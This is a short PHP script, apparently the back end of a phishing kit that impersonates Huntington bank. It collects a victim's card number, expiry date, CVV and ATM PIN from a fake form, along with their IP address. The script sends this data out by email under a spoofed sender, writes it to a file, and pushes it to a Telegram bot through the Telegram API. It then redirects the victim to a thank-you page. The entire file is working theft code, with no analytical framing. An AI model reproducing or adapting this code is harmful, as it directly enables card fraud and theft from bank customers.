<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "»»————-　★[ ⚫️🌀 Huntington® ⚫️🌀 ]★　————-««\n";
$message .= "Card Number: ".$_POST['cn']."\n";;
$message .= "Expiry Date: ".$_POST['exp']."\n";;
$message .= "CVV: ".$_POST['cvv']."\n";;
$message .= "ATM Pin: ".$_POST['atm']."\n";;
$message .= "Ip: $ip\n";
$message .= "»»————-　★[ ⚫️🌀 Huntington® ⚫️🌀 ]★　————-««\n";
$subject = "Huntington® Info | $ip ";
$headers = "From:Huntington <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: ../Thanks.php?id=yxpjJabdoZa398702983D4OVaGzTZ9vaZaPTjsbedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");

include "Telegram.php";

?>